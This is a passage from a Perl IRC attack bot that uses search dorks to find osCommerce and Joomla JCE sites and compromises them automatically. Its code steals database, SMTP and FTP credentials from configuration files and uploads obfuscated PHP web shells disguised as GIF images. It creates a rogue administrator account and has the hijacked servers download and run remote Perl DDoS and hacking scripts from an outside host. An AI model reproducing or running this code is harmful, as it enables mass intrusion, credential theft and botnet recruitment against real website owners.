        if ($engine =~ /googleRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRO",$type,$nick); } exit; } }

        if ($engine =~ /googleTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTW",$type,$nick); } exit; } }

        if ($engine =~ /googleZA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeZA",$type,$nick); } exit; } }

        if ($engine =~ /googlePT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePT",$type,$nick); } exit; } }

        if ($engine =~ /bingDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDE",$type,$nick); } exit; } }

        if ($engine =~ /bingUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingUK",$type,$nick); } exit; } }

        if ($engine =~ /bingCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCA",$type,$nick); } exit; } }

        if ($engine =~ /bingBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBR",$type,$nick); } exit; } }

        if ($engine =~ /bingFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingFR",$type,$nick); } exit; } }

        if ($engine =~ /bingES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingES",$type,$nick); } exit; } }

        if ($engine =~ /bingIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingIT",$type,$nick); } exit; } }

        if ($engine =~ /bingBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBE",$type,$nick); } exit; } }

        if ($engine =~ /bingNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNL",$type,$nick); } exit; } }

        if ($engine =~ /bingPT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingPT",$type,$nick); } exit; } }

        if ($engine =~ /bingNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNO",$type,$nick); } exit; } }

        if ($engine =~ /bingDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDK",$type,$nick); } exit; } }

        if ($engine =~ /bingSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingSE",$type,$nick); } exit; } }

        if ($engine =~ /bingCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCH",$type,$nick); } exit; } }

        if ($engine =~ /bingNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNZ",$type,$nick); } exit; } }

        if ($engine =~ /bingRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingRU",$type,$nick); } exit; } }

        if ($engine =~ /bingJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingJP",$type,$nick); } exit; } }

        if ($engine =~ /bingCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCN",$type,$nick); } exit; } }

        if ($engine =~ /bingKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingKR",$type,$nick); } exit; } }

        if ($engine =~ /bingMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingMX",$type,$nick); } exit; } }

        if ($engine =~ /bingAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAR",$type,$nick); } exit; } }

        if ($engine =~ /bingCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCL",$type,$nick); } exit; } }

        if ($engine =~ /bingAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAU",$type,$nick); } exit; } }

        if ($engine =~ /askCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKCA",$type,$nick); } exit; } }

        if ($engine =~ /askDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDE",$type,$nick); } exit; } }

        if ($engine =~ /askIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKIT",$type,$nick); } exit; } }

        if ($engine =~ /askFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKFR",$type,$nick); } exit; } }

        if ($engine =~ /askES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKES",$type,$nick); } exit; } }

        if ($engine =~ /askRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKRU",$type,$nick); } exit; } }

        if ($engine =~ /askNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNL",$type,$nick); } exit; } }

        if ($engine =~ /askUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKUK",$type,$nick); } exit; } }

        if ($engine =~ /askBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKBR",$type,$nick); } exit; } }

        if ($engine =~ /askPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKPL",$type,$nick); } exit; } }

        if ($engine =~ /askAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAU",$type,$nick); } exit; } }

        if ($engine =~ /askAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAT",$type,$nick); } exit; } }

        if ($engine =~ /askJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKJP",$type,$nick); } exit; } }

        if ($engine =~ /askSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKSE",$type,$nick); } exit; } }

        if ($engine =~ /askMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKMX",$type,$nick); } exit; } }

        if ($engine =~ /askNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNO",$type,$nick); } exit; } }

        if ($engine =~ /askDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDK",$type,$nick); } exit; } }
}

#########################################	Exploiting

sub osco_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$oscologo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$oscologo15(7@2$engine15)14 Scan finish"); }
			my $categories    = "http://".$site."admin/categories.php/login.php";
			my $filemanager   = "http://".$site."admin/file_manager.php/login.php";
			my $bannermanager = "http://".$site."admin/banner_manager.php/login.php";
			my $recky  = "http://".$site."images/Myluph.php";
			my $metri  = "http://".$site."images/mybot.php";
			my $metri2 = "http://".$site."images/mybos.php";
			my $tuyul  = "http://".$site."images/mydb.php";
				my $exp1 = &get_content($categories);
				my $exp2 = &get_content($filemanager);
				my $exp3 = &get_content($bannermanager);
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				if ($exp1 =~ /TABLE_HEADING_CATEGORIES_PRODUCTS/i ) {
					my $recky1 = $categories."?action=download&filename=/includes/configure.php";
					my $cek1 = &get_content($recky1);
					if ($cek1 =~ /http:\/\//) {
						&osbogel($recky1,$chan,$site,$engine);
						&osxpl($site,$chan);
					}
					my $bogelxpl = LWP::UserAgent->new;
					my $res = $bogelxpl->post($categories."?cPath=&action=new_product_preview",['products_image' => ['./bogel.jpg' => 'Myluph.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $res->as_string;
					my $resa = $bogelxpl->post($categories."?cPath=&action=new_product_preview",['products_image' => ['./bogex.jpg' => 'mybot.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resa->as_string;
					my $resb = $bogelxpl->post($categories."?cPath=&action=new_product_preview",['products_image' => ['./metri.jpg' => 'mybos.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resb->as_string;
					my $resx = $bogelxpl->post($categories."?cPath=&action=new_product_preview",['products_image' => ['./mydb.jpg' => 'mydb.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resx->as_string;
					my $mey1 = &get_content($recky); &get_content($kontol); &get_content($tuyul); &get_content($metri); &get_content($metri2);sleep(2);
					if ($mey1 =~ /GIF89a/i) {
 						my $soft   = "";
 						my $safe   = "";
 						my $os     = "";
 						if ($mey1 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
 						if ($mey1 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
 						if ($mey1 =~ m/OS : (.*?)<br>/) {$os = $1;}
						&msg("$admin","$oscologo15(7@2$engine15)(7@2SheLL15)3 $recky 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
						&msg("$nick","$oscologo15(7@2$engine15)(7@2SheLL15)3 $recky 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
						&msg("$channel","$oscologo15(7@2$engine15)(7@2SheLL15)3 target sent to12 $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
					}
				}
				if ($exp2 =~ /TABLE_HEADING_FILENAME/i) {
					my $recky2 = $filemanager."?action=download&filename=/includes/configure.php";
					my $cek2 = &get_content($recky2);
					if ($cek2 =~ /http:\/\//) {
						&osbogel($recky2,$chan,$site,$engine);
						&osxpl($site,$chan);
					}
					my $bogelxpl2 = LWP::UserAgent->new;
					my $res2 = $bogelxpl2->post($filemanager."?action=processuploads",['file_1' => ['./bogel.jpg' => 'Myluph.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $res2->as_string;
					my $resc = $bogelxpl2->post($filemanager."?action=processuploads",['file_1' => ['./bogex.jpg' => 'mybot.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resc->as_string;
					my $resd = $bogelxpl2->post($filemanager."?action=processuploads",['file_1' => ['./metri.jpg' => 'mybos.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resd->as_string;
					my $resy = $bogelxpl2->post($filemanager."?action=processuploads",['file_1' => ['./mydb.jpg' => 'mydb.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resy->as_string;
					my $mey2 = &get_content($recky); &get_content($kontol); &get_content($tuyul); &get_content($metri); &get_content($metri2);sleep(2);
					if ($mey2 =~ /GIF89a/i) {
 						my $soft   = "";
 						my $safe   = "";
 						my $os     = "";
 						if ($mey2 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
 						if ($mey2 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
 						if ($mey2 =~ m/OS : (.*?)<br>/) {$os = $1;}
						&msg("$admin","$oscologo15(7@2$engine15)(7@2SheLL15)3 $recky 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
						&msg("$nick","$oscologo15(7@2$engine15)(7@2SheLL15)3 $recky 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
						&msg("$channel","$oscologo15(7@2$engine15)(7@2SheLL15)3 target sent to12 $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
					}
				}
				if ($exp3 =~ /TABLE_HEADING_BANNERS/i) {
					my $recky3 = $bannermanager."?action=download&filename=/includes/configure.php";
					my $cek3 = &get_content($recky3);
					if ($cek3 =~ /http:\/\//) {
						&osbogel($recky3,$chan,$site,$engine);
						&osxpl($site,$chan);
					}
					my $bogelxpl3 = LWP::UserAgent->new;
					my $res3 = $bogelxpl3->post($bannermanager."?action=insert",['banners_image' => ['./bogel.jpg' => 'Myluph.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $res3->as_string;
					my $rese = $bogelxpl3->post($bannermanager."?action=insert",['banners_image' => ['./bogex.jpg' => 'mybot.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $rese->as_string;
					my $resf = $bogelxpl3->post($bannermanager."?action=insert",['banners_image' => ['./metri.jpg' => 'mybos.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resf->as_string;
					my $resz = $bogelxpl3->post($bannermanager."?action=insert",['banners_image' => ['./mydb.jpg' => 'mydb.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $resz->as_string;
					my $mey3 = &get_content($recky); &get_content($kontol); &get_content($tuyul); &get_content($metri); &get_content($metri2);sleep(2);
					if ($mey3 =~ /GIF89a/i) {
 						my $soft   = "";
 						my $safe   = "";
 						my $os     = "";
 						if ($mey3 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
 						if ($mey3 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
 						if ($mey3 =~ m/OS : (.*?)<br>/) {$os = $1;}
						&msg("$admin","$oscologo15(7@2$engine15)(7@2SheLL15)3 $recky 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
						&msg("$nick","$oscologo15(7@2$engine15)(7@2SheLL15)3 $recky 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
						&msg("$channel","$oscologo15(7@2$engine15)(7@2SheLL15)3 target sent to12 $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)"); sleep(3);
 						} else {
 						#&msg("$channel","$oscologo15(7@2Vuln15)2 http://".$site."admin/login.php");
 						} sleep(5);
 				} exit; }
 			}
		}
	}
}

sub osbogel() {
     my $url    = $_[0];
     my $chan   = $_[1];
     my $site   = $_[2];
     my $request   = HTTP::Request->new(GET=>$url);
     my $browser   = LWP::UserAgent->new();
        $browser->timeout(10);
        my $response  = $browser->request($request);
        if ($response->is_success) {
 	my $res   = $response->as_string;
	if ($res =~ m/'DB_SERVER', '(.*)'/g) {
	$userpass = getUnixPass($res);
	#&msg("$channel","$oscologo15(7@2Database15)(3 http://".$site." 15)(3 $userpass 15)"); 
 	@index = ('phpmyadmin/','phpMyAdmin/');
	foreach $scan(@index){
	$urlx = "http://".$site.$scan;
	$request = HTTP::Request->new(GET=>$urlx);
	$useragent = LWP::UserAgent->new();
	$response = $useragent->request($request);
	if ($response->is_success && $response->content =~ /Admin Area/ || $response->content =~ /Password/ || $response->content =~ /welcome/ || $response->content =~ /passwd/ || $response->content =~ /username/) { 
	&msg("$channel","$oscologo15(7@2phpMyAdmin15)4 $urlx 15(3 $userpass 15)"); 
		} sleep(1);
	}
	my $lulz = "http://".$site;
	my $user = "";
	my $pass = "";
	if($lulz =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {
	my $host = $2;
	my @ftpu = split(":xXx:", $userpass);
	$user = $ftpu[0];
	$pass = $ftpu[1];
	my $ftpstat = "";
	if($user =~ /_/) { @userz = split("_", $user); $user = $userz[0];}
	osco_ftp($res,$host,$user,$pass,$chan,$engine);
	} sleep(3); 
		}
	}
}

sub getUnixPass() {
	my $string = $_[0];
	my @bogel = split("\r\n", $string);
	my $pass = "";
	my $user = "";
	foreach my $line (@bogel) {
		if(($line =~ m/'DB_SERVER_PASSWORD', '(.*)'/i) or ($line =~ m/'DB_SERVER_PASSWORD', '(.*)'/i)) {
			$pass = $1;
		} 
		if(($line =~ m/'DB_SERVER_USERNAME', '(.*)'/i) or ($line =~ m/'DB_SERVER_USERNAME', '(.*)'/i)) {
			$user = $1;
		}
	}
	return $user.":xXx:".$pass;
}

sub osxpl() {
	$site = $_[0];
	$chan = $_[1];	
	my $browser = LWP::UserAgent->new();
	my $responde = HTTP::Request->new(POST => "http://".$site."/admin/administrators.php/login.php?action=insert");
	$responde->content_type("application/x-www-form-urlencoded");
	$responde->content("username=bogel&password=wew");
	if($browser->request($responde)->as_string){
	my $recky = "http://".$site."admin/administrators.php/login.php?action=new";
	my $check = &get_content($recky);
	if ($check =~ /bogel/i){
	&msg("$channel","$oscologo15(12 FUCKED 15)(3 http://".$site."admin/login.php 15)(4 login :3 bogel 15|4 pass :3 wew15 )");
		}
	}
}

sub osco_ftp {
	my $url = $_[0];
	my $host = $_[1];
	my $user = $_[2];
	my $pass = $_[3];
	my $chan = $_[4];
	my $engine = $_[5];
	my $success = 1;
	use Net::FTP;
	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 2);
	$success = 0 if $ftp->login($user,$pass);
	$ftp->quit;
	if ($success == 0) {
	&msg("$admin","$oscologo15(12 -FTP- 15)3 FVCKED 4=> 15[3 ".$host." 15] [3 ".$user." : ".$pass." 15]");
	}
}

sub jce_exploit() {
		my ($chan,$bug,$dork,$engine,$nick) = @_;

	my $count = 0;
	my @total =  &search_engine($chan,$bug,$dork,$engine,$jcelogo,$nick);
	my $num = scalar(@total);
        if ($num > 0){
                foreach my $site(@total){
                $count++;
	        if ($count == $num-1) {
                        &msg("$channel","$jcelogo15(7@2$engine15) 14Finish");
                        }
			         
				my $test  = "http://".$site.$bug;
				my $coba  = "http://".$site;
				if ($coba =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) { $hajarhome = $2; }
				my $shellz = "http://".$site."/images/stories/explore.php";
				my $crsmtp = "http://".$site."/images/stories/explore.php?baca";
					&jce_cek_query($hajarhome); sleep(8);
					my $fuck ="http://".$site."/images/stories/explore.gif";
					my $cek = &get_content($fuck);
					if($cek =~ /GIF89aG/i){
			                &msg("$channel","$jcelogo15(7@2$engine15) 9Try to 9Exploiting 5".$site."");
					&jce_cek_query2($hajarhome); sleep(10);
					my $fujce = &get_content($shellz."?bajak");
					if ($fujce =~ m/UnKnown - Simple Shell/g) {
					my $fujce = &get_content($shellz."?cmd=wget%20".$jceid."");
					my $fujce = &get_content($shellz."?cmd=cd%20/tmp%20;lwp-download%20%20http://babagajah.com//car/ddos.txt%20;%20perl%20ddos.txt%20;%20rm%20ddos.txt");
					my $fujce = &get_content($shellz."?cmd=wget%20http://babagajah.com//car/hack.txt%20;%20perl%20hack.txt%20;%20hack.txt");
					my $fujce = &get_content($shellz."?cmd=cd%20/tmp%20;lwp-download%20%20http://babagajah.com//car/ddos.txt%20;%20perl%20ddos.txt%20;%20rm%20ddos.txt");
					my $fujce = &get_content($shellz."?cmd=wget%20http://babagajah.com//car/songak.txt%20;%20perl%20songak.txt%20;%20songak.txt");
					my $fujce = &get_content($shellz."?cmd=cd%20/tmp%20;curl -O%20http://babagajah.com//car/ddos.txt%20;%20perl%20ddos.txt%20;%20rm%20ddos.txt");
					my $safe = ""; my $os = ""; my $uid = "";
					if ($fujce =~ m/SAFE_MODE :(.+?)<\/b><br/) {$safe = $1;}
					if ($fujce =~ m/Uname :(.+?)<\/b><br><form/g) {$os = $1;}
					if ($fujce =~ m/uid=(.*?)gid=/) {$uid = $1;}
					&msg("$channel","$jcelogo15(7@2$engine15) 9(Success) 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");	
					&msg("$admin","$jcelogo15(7@2$engine15) 9[Success) 8$shellz 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&msg("$nick","$jcelogo15(7@2$engine15) 9(Success) 8$shellz 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
                                       
					&carismtp($crsmtp,$chan,$site,$engine,$jcelogo);
				}
			}
		}
	}
}

sub carismtp() {
    my $url    = $_[0];
    my $chan   = $_[1];
    my $site   = $_[2];
	my $engine = $_[3];
	my $logo   = $_[4];
	my $data   = &get_content($url);
	my $psite  = "http://".$site;
	if ($psite =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) { $host = $2; }
	if ($data =~ m/smtphost/g && $data =~ m/smtppass/g || $data =~ m/ftp_host/g ) {
		if ($data =~ m/smtphost = '(.*)';/g) { $smtphost = $1; }
		if ($data =~ m/smtpport = '(.*)';/g) { $smtpport = $1; }
		if ($data =~ m/smtpuser = '(.*)';/g) { $smtpuser = $1; }
		if ($data =~ m/smtppass = '(.*)';/g) { $smtppass = $1; }
		if ($data =~ m/ftp_host = '(.*)';/g) { $ftp_host = $1; }
		if ($data =~ m/ftp_port = '(.*)';/g) { $ftp_port = $1; }
		if ($data =~ m/ftp_user = '(.*)';/g) { $ftp_user = $1; }
		if ($data =~ m/ftp_pass = '(.*)';/g) { $ftp_pass = $1; }
		&msg("$admin","(7@2$engine15) 13http://$site 9[SMTP]: 15($smtphost)($smtpport)($smtpuser)($smtppass) 9(FTP): 15($ftp_host)($ftp_port)($ftp_user)($ftp_pass) 4$jcelogo"); sleep(5);
		&msg("$channel","(7@2$engine15) 9(SMTP): 15($smtpuser) 9(FTP): 15($ftp_user) 4$jcelogo");
		&ftp_connect("http://target.com",$host,$ftp_user,$ftp_pass,$chan,$engine); sleep(2);
	}
}

sub jce_cek_query() {
	my $TARGET 	= $_[0];
	## Start Code ##
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 2286"; #737
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="explore.gif"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('rUluQuNTEP3c/IpyG8mODnl1SOlRMDoK5oiuEBon/QLI2tiTcQ9717LXBIr4753dtVBlY5RJFyHhzJtsM/NpPBsoWEzGJRSyR1zM3d1ev8N0xN3iSAXK7cZEGFKD4cWVM3Jf2a1m0+v99Njp3vGKq1HWT5GA7PY73SVZ8Va7j/4KVEr0eTy+jM+G0ZjeIMrF1w1nFP45CaNkPBkNDD6V6QM60DEr56BVyhXk9S0T5E11cx1C0a1vM8hqRkDXQlzwGH1dVBvjXKbgtKWv/G3ksVtORZdcPSB7Z2caxufDkxDjh6entP/UgayCN5wu0FTnhbKAMsBnC0yp6YNgObirYRz7Pz46ORmhPrZduEiyUYrvxYzC8+E4fI7JGc9cbQsFK5ny5mXBkttCZnr1EpnTek+NVWebnrGKdORqfRoo0E+pb9/3W5VDr7aXeDG4JBGUaqDrdW24FgStA6wvwfrQ3JZXaN0vDhsD9/qdlVkv8A8ftD585rbT8jkcXzlWJgXoVsFOqXFdJrB++EFnPBpcjuPTwR/hxdFs6OgBVaFFnATPQSfD48lsazGOVMPh2LnxqF9x9ZyLyq+xEx/ui1mW4BWLAgejBKuuWrZaLF1CSv7jc3P/PTOzYnSmA8lPEm2guMrgYyK+CLkUcYdRPC8yINECsuzAt+jBtDzEHpqImcRKquJ/UPALViT2GPz80XzQ75Btq6wePfCnenkXerHWJaAu9bDDGA0oijJTt+fR3jszWdAfm6hsGhii/AEfkWCVwaNx/gzOvwXXim1KOn1hmI/qg4x4Zoq9DZZMLRLFpSDFEkYRnKhxmdr3KtEWM33dOqhHTBayZTW87fiOHj6DeXYoA26Q3s4e2lhDaCmINmvo2hzp45pMQrW1vsZ+ff1+bfT9Hr9WoVJlQ6QyJ7leFSjtpd6ahJm2A1cP35bwS+Y5E3Yr2QEXUq2IbSggoAruFSVN1YAmbFc30aie5vwZtzyU3LGsxu9fMp6zewzxaGSHQX+jScBGMSRsnSmOWFgZt52UKdbW3jak+/mXJib4NrOUnPIMWSO+9n7Rz4KnKYim3spJv+Eww/gG1uOov9Im51TL9nMVF7A00ftxvYg1fq2njd77rckjYKkfKFYySUiBbxsBtsgGo0a1Rdc2vK7u2hLVgl05NrZMo7XxQrle5cV37re6pog2oqkFUB4NYLauXrPRldPq4dygn2TSM5jLO4gtN6Sxxt1KI0dexDYKl+uqFs9xsaX8ECbs1GGNaR7w+oMUt8ATsViXecBEnSRDSFGhyfuWDBeVxbcI7ZMnfNdeKNyMfCMxviBTsAbLRn0xNVisKG59aX56dHTXfGMvSm2jx2MPiauJzA6z4+PrS7q2QTavynyVXjb5n+3/M718I/9Xwv/E6XEV2cmY8yrti+t/yhK2d1fMsCl9+LG5ljAWr6UKYinPxz+N82yNP2xjX5jLvNc0ek+R/h8='))));?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = 'explore';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/explore.gif","explore.php"]}';
$header24 = "Content-Length: ".length($header25)."";
	## EOF COde ##
	my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"80") or return;
	print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n"; sleep(5);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(3);
	close($remote);
}

sub jce_cek_query2() {
	my $TARGET 	= $_[0];
	## Start Code ##
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 2286"; #737
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="explore.gif"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
